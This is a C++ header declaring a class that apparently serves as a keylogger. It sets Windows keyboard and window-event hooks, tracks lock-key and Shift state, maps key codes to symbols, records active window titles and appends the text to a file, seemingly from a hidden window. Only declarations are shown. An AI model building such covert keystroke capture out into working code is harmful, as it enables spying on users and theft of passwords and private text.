#pragma once
#include <Windows.h>

#include <string>
#include <mbstring.h>
#include <locale>
#include <codecvt>

#include <Winuser.h>

#define maxChars 256

class HandleUserInput
{
	HANDLE _hiddenWnd;

private:
	static bool _isCapsLock;
	static bool _isNumLock;
	static bool _isScrollLock;
	static bool _isShift;
	//HFILE file;
	HANDLE file;





public:
	HHOOK HookId;
	HWINEVENTHOOK WindowHookId;

	//static LPCSTR _filename;
	static LPCWSTR _filename;

	static HANDLE hFile;

	static void SetKeysState();
	static std::wstring GetSymbol(UINT vkCode);

	static LPDWORD AppendTextToFile(std::string buffer);
	static LPDWORD AppendTextToFileW(std::wstring buffer);
	//HookProc — это заполнитель для имени, определяемого приложением.
	//static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
	//HHOOK SetHook(int typeOfHook, HOOKPROC lpfn);
	HHOOK SetHook(int typeOfHook, HOOKPROC lpfn, DWORD dwThreadId);
	HWINEVENTHOOK SetWinHook(WINEVENTPROC callBack);
	static LPWSTR GetActiveWindowTitle();
	static char* ConvertWcharToChar(LPWSTR str);
	static std::string ConvertWideStringToUTF8(const wchar_t* str);

	//static void ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HWND hWnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);

	void GetFile();

	HandleUserInput(HANDLE hiddenWnd);
	~HandleUserInput();
};

